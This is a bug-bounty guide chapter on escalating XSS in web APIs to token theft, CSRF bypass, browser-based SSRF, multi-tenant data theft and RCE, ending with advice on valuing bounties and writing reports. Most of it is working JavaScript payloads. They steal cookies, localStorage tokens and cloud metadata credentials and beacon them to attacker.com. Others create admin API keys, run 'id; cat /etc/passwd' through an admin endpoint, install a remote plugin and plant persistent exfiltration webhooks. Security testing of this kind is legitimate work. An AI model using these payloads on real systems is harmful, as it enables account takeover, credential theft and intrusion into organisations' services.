# 72 - API XSS Chaining and Impact Escalation

## Overview

XSS chaining in API contexts escalates impact through:
- XSS + API token theft + privilege escalation (Grafana CVE-2025-6023)
- XSS + CSRF bypass via stolen anti-CSRF tokens
- XSS + SSRF chains using the victim's browser as a proxy
- Mass assignment + XSS at scale across customer instances
- XSS-to-RCE via API endpoints (admin console commands, plugin installation)
- Strategic bounty valuation for chained vulnerabilities

## XSS + API Token Theft + Privilege Escalation

### Grafana Case Study (CVE-2025-6023)

**CVE-2025-6023:** XSS in Grafana that was chained with API token theft and privilege escalation. The chain:

1. Initial XSS via a crafted dashboard annotation or panel title
2. XSS payload steals the victim's Grafana API token from localStorage or cookies
3. Stolen API token is used to call Grafana's admin API endpoints
4. Attacker escalates their account to Organization Admin or Server Admin
5. Admin access enables data exfiltration across all dashboards and data sources

```javascript
// Step 1: XSS payload that steals API token and escalates privileges
// Injected via vulnerable Grafana field (annotation, panel title, etc.)

fetch('/api/auth/keys', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + document.cookie.match(/grafana_session=([^;]+)/)[1]
  },
  body: JSON.stringify({
    name: 'exfil-key',
    role: 'Admin'
  })
})
.then(r => r.json())
.then(data => {
  // Step 2: Exfiltrate the admin API key
  fetch('https://attacker.com/collect?key=' + data.key);
  
  // Step 3: Use admin access to add attacker as org admin
  fetch('/api/org/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + data.key
    },
    body: JSON.stringify({
      loginOrEmail: 'attacker@evil.com',
      role: 'Admin'
    })
  });
});
```

### Generic API Token Theft Pattern

```javascript
// Universal XSS-to-token-theft pattern for SPAs
// Most SPAs store tokens in localStorage, sessionStorage, or cookies

// Steal from localStorage
var tokens = {};
for (var i = 0; i < localStorage.length; i++) {
  var key = localStorage.key(i);
  if (key.match(/token|auth|session|jwt|api.key/i)) {
    tokens[key] = localStorage.getItem(key);
  }
}

// Steal from cookies
tokens['cookies'] = document.cookie;

// Exfiltrate
navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(tokens));
```

### Token Types and Their Value

| Token Type | Storage Location | XSS Accessible | Escalation Potential |
|---|---|---|---|
| JWT in localStorage | localStorage | Yes | High -- full API access |
| Session cookie (no HttpOnly) | Cookie | Yes | High -- session hijack |
| Session cookie (HttpOnly) | Cookie | No -- but CSRF possible | Medium |
| API key in localStorage | localStorage | Yes | Critical -- persistent access |
| OAuth access token | localStorage/memory | Yes/Sometimes | High -- scoped access |
| Refresh token | localStorage | Yes | Critical -- long-lived access |

## XSS + CSRF Bypass

### Anti-CSRF Token Theft

When an application uses anti-CSRF tokens, XSS can read the token from the DOM or from an API response, then use it to perform any CSRF-protected action.

```javascript
// XSS payload: steal CSRF token and perform privileged action

// Method 1: Read CSRF token from meta tag
var csrf = document.querySelector('meta[name="csrf-token"]').content;

// Method 2: Read CSRF token from API endpoint
fetch('/api/csrf-token')
  .then(r => r.json())
  .then(data => {
    var csrf = data.token;
    
    // Perform CSRF-protected action (e.g., change admin email)
    fetch('/api/admin/settings', {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf
      },
      body: JSON.stringify({
        admin_email: 'attacker@evil.com'
      })
    });
  });
```

### SameSite Cookie Bypass

XSS executes in the same origin, so SameSite cookie restrictions do not apply. This means XSS bypasses all three SameSite modes (Strict, Lax, None) for CSRF attacks.

## XSS + SSRF Chains

### Browser as SSRF Proxy

XSS can turn a victim's browser into an SSRF proxy, reaching internal services that the attacker cannot access directly.

```javascript
// XSS payload: use victim's browser to access internal services

// Scan internal network
var internalHosts = [
  'http://192.168.1.1',
  'http://10.0.0.1',
  'http://metadata.google.internal',
  'http://169.254.169.254/latest/meta-data/',
  'http://internal-api.local:8080'
];

internalHosts.forEach(function(host) {
  fetch(host, { mode: 'no-cors' })
    .then(function() {
      // Host is reachable from victim's network
      navigator.sendBeacon('https://attacker.com/reachable', host);
    })
    .catch(function() {});
});

// Exfiltrate cloud metadata (if victim is on cloud instance)
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(role => {
    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role)
      .then(r => r.text())
      .then(creds => {
        navigator.sendBeacon('https://attacker.com/creds', creds);
      });
  });
```

### XSS + Internal API Access

If the victim's browser is on a corporate network, XSS can access internal APIs that are not exposed to the internet.

```javascript
// Access internal admin API via XSS in public-facing application
fetch('http://internal-admin.corp:8080/api/users', {
  credentials: 'include'  // Send victim's internal cookies
})
.then(r => r.json())
.then(users => {
  navigator.sendBeacon('https://attacker.com/internal-data', JSON.stringify(users));
});
```

## Mass Assignment + XSS at Scale

### Multi-Tenant Impact

When mass assignment XSS affects a multi-tenant platform, a single payload can execute across hundreds of customer instances (see chatbot platform case study in chapter 68, affecting ~500 instances).

```javascript
// XSS payload designed for multi-tenant impact
// Injected via mass assignment into a shared template field

// Payload collects data from each customer instance where it renders
(function() {
  var data = {
    origin: window.location.origin,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: window.location.href
  };
  navigator.sendBeacon('https://attacker.com/multitenant', JSON.stringify(data));
})();
```

### Escalation Path

1. Find mass assignment vulnerability in API
2. Inject XSS into a field rendered across customer instances
3. Each customer instance executes the payload
4. Steal session tokens from each instance
5. Access customer data across the entire platform

## XSS-to-RCE via API Endpoints

### Admin Console Command Execution

Applications with admin APIs that execute system commands can be chained with XSS for RCE.

```javascript
// XSS-to-RCE: Execute system commands via admin API
// Requires XSS to fire in an admin user's browser

// Kong Insomnia CVE-2025-1087 pattern (CVSS 9.8):
// XSS in API client -> RCE via plugin/extension mechanism

// Generic admin API pattern:
fetch('/api/admin/execute', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('admin_token')
  },
  body: JSON.stringify({
    command: 'id; cat /etc/passwd'
  })
})
.then(r => r.text())
.then(output => {
  navigator.sendBeacon('https://attacker.com/rce', output);
});
```

### Plugin/Extension Installation

Many platforms allow admins to install plugins or extensions via API. XSS in an admin's browser can trigger installation of a malicious plugin.

```javascript
// XSS-to-RCE via malicious plugin installation
fetch('/api/admin/plugins/install', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    url: 'https://attacker.com/malicious-plugin.zip'
  })
});
```

### Webhook Configuration for Persistent Access

XSS can configure webhooks that send data to attacker-controlled endpoints, establishing persistent data exfiltration that survives after the XSS is fixed.

```javascript
// XSS payload: Configure webhook for persistent access
fetch('/api/webhooks', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    url: 'https://attacker.com/webhook',
    events: ['user.created', 'payment.completed', 'data.exported'],
    active: true
  })
});
```

## Bounty Valuation Strategies

### Impact Multipliers

| Chain | Typical Severity | Bounty Multiplier |
|---|---|---|
| Self-XSS alone | Informational/Low | 0-0.5x |
| Reflected XSS | Medium | 1x |
| Stored XSS | High | 1.5-2x |
| XSS + Token theft | High-Critical | 2-3x |
| XSS + Account takeover | Critical | 3-5x |
| XSS + RCE | Critical | 5-10x |
| XSS + Multi-tenant impact | Critical | 5-10x |
| XSS + SSRF + Cloud metadata | Critical | 5-10x |

### Report Writing for Chained Vulnerabilities

1. **Lead with the full chain impact**, not the initial XSS
2. **Demonstrate each step** with proof-of-concept
3. **Quantify affected users** (multi-tenant = all customers)
4. **Show persistence** (webhook installation, API key creation)
5. **Reference similar CVEs** for severity justification (Grafana CVE-2025-6023)
6. **Title the report** by the end result, not the entry point: "Account Takeover via Stored XSS in Dashboard Annotations" not "XSS in Dashboard"

### Common Escalation Paths to Document

```
Self-XSS -> IDOR -> Stored XSS -> Token Theft -> Account Takeover
Reflected XSS -> CSRF Token Steal -> Admin Action -> RCE
Stored XSS -> Admin Session Hijack -> Plugin Install -> RCE
Mass Assignment -> Stored XSS -> Multi-Tenant Token Theft
XSS -> Webhook Config -> Persistent Data Exfiltration
XSS -> API Key Creation -> Persistent Admin Access
XSS -> Browser SSRF -> Cloud Metadata -> AWS/GCP Takeover
```

## Testing Methodology

1. **Map all API endpoints** accessible from XSS context (admin APIs, token APIs)
2. **Identify token storage** (localStorage, sessionStorage, cookies without HttpOnly)
3. **Test anti-CSRF token accessibility** from XSS context
4. **Check for admin APIs** that execute commands or install plugins
5. **Test internal network reachability** from XSS context
6. **Check for webhook APIs** that can be configured for persistent access
7. **Test multi-tenant impact** when XSS is found in shared components
8. **Document the full chain** with each step's proof-of-concept

## Bug Bounty Tips

1. Always chain XSS with API access -- the chain is where the bounty multiplier lives
2. Grafana CVE-2025-6023 is the reference case for XSS+token+privesc chains
3. Self-XSS + IDOR = exploitable -- never accept "self-XSS is out of scope"
4. Token theft from localStorage is almost always possible via XSS in SPAs
5. SameSite cookies do NOT protect against XSS-based CSRF
6. XSS-to-RCE via admin APIs or plugin installation is the highest-value chain
7. Webhook configuration via XSS creates persistent access that survives XSS remediation
8. Title your report by the end impact (Account Takeover, RCE) not the entry point (XSS)
9. Multi-tenant XSS affecting 100+ instances is Critical severity by default
10. Document each chain step separately with its own PoC for maximum clarity
